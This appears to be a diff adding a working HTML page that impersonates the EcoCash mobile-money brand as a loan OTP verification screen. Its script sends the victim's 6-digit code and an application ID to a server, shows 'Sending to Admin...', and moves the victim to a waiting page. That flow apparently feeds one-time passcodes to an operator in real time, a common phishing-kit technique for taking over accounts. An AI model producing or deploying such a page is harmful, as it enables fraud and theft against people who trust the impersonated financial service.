@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify OTP - EcoCash Loans</title>
+    <style>
+        :root { --eco-navy: #003366; --eco-blue: #0066CC; --eco-green: #00A859; --bg-color: #f4f6f8; --text-color: #333; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { margin: 0; background-color: var(--bg-color); color: var(--text-color); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .app-header { background-color: var(--eco-navy); color: white; padding: 15px 20px; width: 100%; display: flex; justify-content: center; align-items: center; font-size: 18px; font-weight: 600; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); width: 90%; max-width: 400px; text-align: center; margin-top: 40px; }
+        h1 { font-size: 22px; margin-bottom: 10px; color: var(--eco-navy); }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; }
+        .otp-box { border: 2px dashed var(--eco-blue); background-color: #f0f7ff; padding: 20px; border-radius: 8px; margin-bottom: 25px; }
+        .otp-box span { font-size: 40px; display: block; margin-bottom: 10px;}
+        input[type="text"] { width: 100%; padding: 15px; font-size: 24px; text-align: center; letter-spacing: 8px; border: 1px solid #ccc; border-radius: 8px; outline: none; margin-bottom: 20px; background: #fafafa; }
+        input[type="text"]:focus { border-color: var(--eco-blue); background: #fff; }
+        button { width: 100%; padding: 16px; background-color: var(--eco-green); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 6px rgba(0, 168, 89, 0.2); }
+        button:active { background-color: #008f4a; }
+        .error-msg { color: #d9534f; font-weight: bold; margin-top: 15px; display: none; }
+    </style>
+</head>
+<body>
+
+<header class="app-header">EcoCash Loans</header>
+
+<div class="container">
+    <h1>Enter OTP</h1>
+    <p>Enter the 6-digit code sent to your phone from our loan system.</p>
+    
+    <div class="otp-box">
+        <span>🔐</span>
+        <strong style="color: var(--eco-navy);">Verification Code</strong>
+    </div>
+
+    <input type="text" id="otpInput" placeholder="------" maxlength="6" inputmode="numeric">
+    
+    <button onclick="submitOTP()" id="submitBtn">Submit OTP</button>
+    <div id="errorMsg" class="error-msg">❌ Please enter a 6-digit code.</div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const appId = urlParams.get('appId');
+
+    if (!appId) {
+        alert("Invalid session. Please start a new application.");
+        window.location.href = "/";
+    }
+
+    async function submitOTP() {
+        const otp = document.getElementById('otpInput').value;
+        const errorMsg = document.getElementById('errorMsg');
+        const btn = document.getElementById('submitBtn');
+
+        if (otp.length !== 6) {
+            errorMsg.style.display = 'block';
+            return;
+        }
+
+        btn.innerText = 'Sending to Admin...';
+        btn.disabled = true;
+        errorMsg.style.display = 'none';
+
+        try {
+            const response = await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ appId, otp })
+            });
+            const result = await response.json();
+
+            if (result.success) {
+                window.location.href = `/wait.html?appId=${appId}`;
+            } else {
+                errorMsg.innerText = result.message;
+                errorMsg.style.display = 'block';
+                btn.innerText = 'Submit OTP';
+                btn.disabled = false;
+            }
+        } catch (error) {
+            errorMsg.innerText = "Server busy, please try again.";
+            errorMsg.style.display = 'block';
+            btn.innerText = 'Submit OTP';
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
